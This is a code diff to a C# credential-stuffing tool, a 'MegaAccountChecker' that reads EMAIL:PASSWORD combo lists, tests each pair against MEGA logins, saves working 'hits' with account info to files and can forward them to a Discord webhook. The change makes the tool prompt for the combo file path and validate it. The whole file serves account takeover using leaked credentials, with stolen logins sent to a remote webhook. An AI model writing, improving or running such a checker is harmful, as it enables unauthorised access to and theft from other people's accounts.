@@ -13,13 +13,14 @@ namespace Fish_Tools.core.MiscTools.AccountChecker.Checkers
 {
     internal class MegaAccountChecker
     {
-        private static readonly string CombosFile = "Combos.txt";
+        private static string CombosFile;
         private static readonly string HitsFile = "Result/MegaHits [email pass].txt";
         private static readonly string HitsFile2 = "Result/MegaHits [email pass + Info].txt";
         private static bool UsingDiscord;
         private static string DiscordWebHook;
-        private const int CooldownTime = 550; 
+        private const int CooldownTime = 550;
         public static bool ReTry = false;
+
         public static void Main(Logger logger)
         {
             Console.Clear();
@@ -28,15 +29,24 @@ namespace Fish_Tools.core.MiscTools.AccountChecker.Checkers
 
             if (!File.Exists(HitsFile)) { File.Create(HitsFile).Close(); }
             if (!File.Exists(HitsFile2)) { File.Create(HitsFile2).Close(); }
-            logger.Info($"Place your combo inside \"{CombosFile}\" in format EMAIL:PASSWORD and press enter.");
-            Console.ReadKey();
 
-            logger.Info($"If you want hits to be sent to your Discord, insert webhook and press enter. Otherwise, leave blank:");
+            logger.Info("Please provide the path to your combos file (format: EMAIL:PASSWORD):");
+            Console.Write("-> ");
+            CombosFile = Console.ReadLine();
+
+            while (string.IsNullOrWhiteSpace(CombosFile) || !File.Exists(CombosFile))
+            {
+                logger.Error("Invalid path or file does not exist. Please try again:");
+                CombosFile = Console.ReadLine();
+            }
+
+            logger.Info("If you want hits to be sent to your Discord, insert webhook and press enter. Otherwise, leave blank:");
+            Console.Write("-> ");
             string discord = Console.ReadLine();
             UsingDiscord = !string.IsNullOrWhiteSpace(discord);
             DiscordWebHook = discord;
 
-            TestCombos(logger).GetAwaiter().GetResult(); 
+            TestCombos(logger).GetAwaiter().GetResult();
             Console.ReadLine();
         }
         private async static Task CheckLogin(string email, string password, Logger logger)
@@ -120,21 +130,14 @@ namespace Fish_Tools.core.MiscTools.AccountChecker.Checkers
         }
         private static async Task TestCombos(Logger logger)
         {
-            if (!File.Exists(CombosFile))
-            {
-                logger.Error($"No combos detected. Please upload them to \"{CombosFile}\".");
-                File.Create(CombosFile).Close();
-                return;
-            }
-
             string[] combos = File.ReadAllLines(CombosFile)
-                .Select(line => line.Trim()) 
+                .Select(line => line.Trim())
                 .Where(line => !string.IsNullOrWhiteSpace(line))
                 .ToArray();
 
             if (combos.Length == 0)
             {
-                logger.Error("No combos detected. Please upload them to \"Combos.txt\".");
+                logger.Error("No valid combos detected in the file.");
                 return;
             }
 
